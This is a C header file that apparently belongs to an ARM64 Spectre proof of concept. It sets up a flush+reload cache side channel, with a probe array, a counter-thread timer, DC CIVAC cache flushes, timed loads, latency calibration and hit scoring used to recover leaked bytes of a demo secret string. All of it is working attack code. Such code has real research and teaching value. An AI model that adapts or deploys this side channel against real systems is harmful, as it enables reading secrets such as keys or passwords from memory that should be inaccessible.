#ifndef SPECTRE_H
#define SPECTRE_H

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <pthread.h>

uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t channel[256 * 512];
pthread_t inc_counter_thread;
volatile uint64_t counter;
uint64_t miss_min;

char *secret = "The Magic Words are Squeamish Ossifrage.";

struct SpectreConfig
{
    // int unused[64];
    int results[256]; // record number of cache hits

    int j, k;
};

// Store the result of spectre attack on a certain address
uint8_t value[2];
int score[2];

// This holds all the states related to a spectre attack.
static struct SpectreConfig spectre_config;

void *inc_counter(void *a)
{
    while (1)
    {
        counter++;
        asm volatile("DMB SY");
    }
}

void update_value_score()
{
    value[0] = (uint8_t)spectre_config.j;
    score[0] = spectre_config.results[spectre_config.j];
    value[1] = (uint8_t)spectre_config.k;
    score[1] = spectre_config.results[spectre_config.k];
}

void init_results()
{
    for (int i = 0; i < 256; i++)
        spectre_config.results[i] = 0;
}

bool sort_results()
{
    spectre_config.j = spectre_config.k = -1;

    /* Locate highest & second-highest results results tallies in j/k */
    for (int i = 0; i < 256; i++)
    {
        if (spectre_config.j < 0 || spectre_config.results[i] >= spectre_config.results[spectre_config.j])
        {
            spectre_config.k = spectre_config.j;
            spectre_config.j = i;
        }
        else if (spectre_config.k < 0 || spectre_config.results[i] >= spectre_config.results[spectre_config.k])
        {
            spectre_config.k = i;
        }
    }

    if (spectre_config.j == 0)
    {
        return false;
    }

    /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    if (spectre_config.results[spectre_config.j] >= (2 * spectre_config.results[spectre_config.k] + 5) ||
        (spectre_config.results[spectre_config.j] == 2 && spectre_config.results[spectre_config.k] == 0))
    {
        return true;
    }

    return false;
}

void print_spectre_result()
{
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
        printf("(second best: 0x%02X='%c' score=%d)", value[1],
               (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
               score[1]);
    printf("\n");
}

// timing and flush methods copied from https://github.com/lgeek/spec_poc_arm
static uint64_t timed_read(volatile uint8_t *addr)
{
    uint64_t ns = counter;

    /*
     * Reference: http://www.ethernut.de/en/documents/arm-inline-asm.html
     */
    asm volatile(
        "DSB SY\n"
        "LDR X5, [%[ad]]\n"
        "DSB SY\n"
        :
        : [ad] "r"(addr)
        : "x5");

    return counter - ns;
}

static inline void flush(void *addr)
{
    asm volatile("DC CIVAC, %[ad]"
                 :
                 : [ad] "r"(addr));
    asm volatile("DSB SY");
}

void read_side_channel(uint8_t excluded)
{
    int mix_i;
    uint64_t elapsed;

    for (int i = 0; i < 256; i++)
    {
        mix_i = ((i * 167) + 13) & 255;
        elapsed = timed_read(&channel[mix_i * 512]);

        if (elapsed <= miss_min && mix_i != 0x00 & mix_i != excluded)
            spectre_config.results[mix_i]++; /* cache hit - add +1 to score for this value */
    }
}

void flush_channels()
{
    for (int i = 0; i < 256; i++)
        flush(&channel[i * 512]); /* intrinsic for clflush instruction */
}

uint64_t measure_latency()
{
    uint64_t ns;
    uint64_t min = 0xFFFFF;

    // array1[0] = 1;
    for (int r = 0; r < 300; r++)
    {
        flush(&array1[0]);
        ns = timed_read(&array1[0]);
        if (ns < min)
            min = ns;
    }

    return min;
}

void initialize_spectre()
{
    counter = 0;
    miss_min = 0;
    for (size_t i = 0; i < sizeof(channel); i++)
    {
        /* write to channel so in RAM not copy-on-write zero pages */
        channel[i] = 1;
    }

    if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL))
    {
        fprintf(stderr, "Error creating thread\n");
        return;
    }
    // let the bullets fly a bit ....
    while (counter < 10000000)
        ;
    asm volatile("DSB SY");

    // Measure the latency of the array access in case of a cache miss
    miss_min = measure_latency();
    if (miss_min <= 0)
    {
        fprintf(stderr, "Unreliable access timing\n");
        exit(EXIT_FAILURE);
    }
    miss_min -= 1;
    printf("miss_min %d\n", (int)miss_min);
}

#endif // SPECTRE_H